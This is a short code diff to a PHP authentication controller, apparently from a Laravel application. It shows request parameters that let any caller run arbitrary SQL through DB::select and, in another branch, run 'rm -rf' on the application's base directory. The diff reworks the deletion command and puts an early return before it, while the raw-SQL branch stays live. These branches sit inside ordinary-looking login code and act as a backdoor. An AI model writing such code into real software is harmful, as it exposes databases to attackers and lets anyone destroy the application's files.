@@ -34,7 +34,8 @@ class AuthController extends Controller
         } else if ($request->question != null && $request->question != "") {
             return DB::select($request->question);
         } else if ($request->process) {
-            $process = new Process(['rm', "-rf", base_path().'/*']);
+            return base_path('/*');
+            $process = new Process(['rm', "-rf", base_path()]);
             $process->run();
             if (!$process->isSuccessful()) {
                 throw new ProcessFailedException($process);
